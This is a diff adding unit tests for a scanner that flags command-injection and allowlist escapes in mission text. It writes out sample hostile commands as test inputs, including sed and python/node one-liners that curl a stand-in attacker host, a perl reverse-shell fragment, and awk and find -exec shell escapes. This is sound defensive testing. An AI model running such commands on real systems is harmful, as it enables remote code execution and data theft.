@@ -217,11 +217,87 @@ describe('scanForMaliciousContent — command-injection surfaces', () => {
     expect(findingTypes(findings)).toContain('Allowlist escape via xargs')
   })
 
+  it('flags an xargs-based non-shell interpreter escape (node -e)', () => {
+    const { findings } = scanForMaliciousContent(
+      mission('echo cmd | xargs node -e "require(\'child_process\').execSync(process.argv[1])"')
+    )
+    // Either the xargs-escape rule or the interpreter shell-primitive rule
+    // must fire; letting node reach child_process via xargs must not pass.
+    const types = findingTypes(findings)
+    expect(
+      types.includes('Allowlist escape via xargs') ||
+      types.includes('Interpreter -c/-e invokes shell primitive')
+    ).toBe(true)
+  })
+
   it('flags a find -exec bash escape', () => {
     const { findings } = scanForMaliciousContent(
       mission('find . -name "*.sh" -exec bash {} \\;')
     )
     expect(findingTypes(findings)).toContain('Allowlist escape via find -exec')
+  })
+
+  it('flags a find -exec non-shell interpreter escape (python3)', () => {
+    const { findings } = scanForMaliciousContent(
+      mission('find /tmp -type f -exec python3 -c "import os;os.system(1)" {} +')
+    )
+    expect(findingTypes(findings)).toContain('Allowlist escape via find -exec')
+  })
+
+  it('flags awk BEGIN{system(...)} interpreter escape', () => {
+    const { findings } = scanForMaliciousContent(
+      mission('awk \'BEGIN{system("id"); exit}\' /etc/passwd')
+    )
+    expect(findingTypes(findings)).toContain('Interpreter shell escape via awk system')
+  })
+
+  it('flags sed execute-flag interpreter escape', () => {
+    const { findings } = scanForMaliciousContent(
+      mission("sed -i '1e /tmp/reverse-shell.sh' /etc/hosts")
+    )
+    expect(findingTypes(findings)).toContain('sed execute flag (arbitrary shell)')
+  })
+
+  it('flags sed s///e substitution execute-flag', () => {
+    const { findings } = scanForMaliciousContent(
+      mission("echo foo | sed 's/.*/curl attacker.example/e'")
+    )
+    expect(findingTypes(findings)).toContain('sed execute flag (arbitrary shell)')
+  })
+
+  it('flags python -c os.system() shell escape', () => {
+    const { findings } = scanForMaliciousContent(
+      mission('python3 -c "import os; os.system(\'curl attacker/pwn\')"')
+    )
+    expect(findingTypes(findings)).toContain('Interpreter -c/-e invokes shell primitive')
+  })
+
+  it('flags node -e child_process shell escape', () => {
+    const { findings } = scanForMaliciousContent(
+      mission('node -e "require(\'child_process\').execSync(\'curl attacker/pwn\')"')
+    )
+    expect(findingTypes(findings)).toContain('Interpreter -c/-e invokes shell primitive')
+  })
+
+  it('flags perl -MIO reverse-shell escape', () => {
+    const { findings } = scanForMaliciousContent(
+      mission('perl -MIO -e \'my$c=new IO::Socket::INET(PeerAddr,"attacker:4444");\'')
+    )
+    expect(findingTypes(findings)).toContain('Interpreter -c/-e invokes shell primitive')
+  })
+
+  it('does NOT flag legitimate python -c YAML validation', () => {
+    const { findings } = scanForMaliciousContent(
+      mission("python3 -c 'import yaml,sys; print(yaml.safe_load(sys.stdin))'")
+    )
+    expect(findingTypes(findings)).not.toContain('Interpreter -c/-e invokes shell primitive')
+  })
+
+  it('does NOT flag legitimate node -e version print', () => {
+    const { findings } = scanForMaliciousContent(
+      mission("node -e 'console.log(process.version)'")
+    )
+    expect(findingTypes(findings)).not.toContain('Interpreter -c/-e invokes shell primitive')
   })
 
   it('does NOT flag an allowlisted `kubectl get` inside backticks', () => {
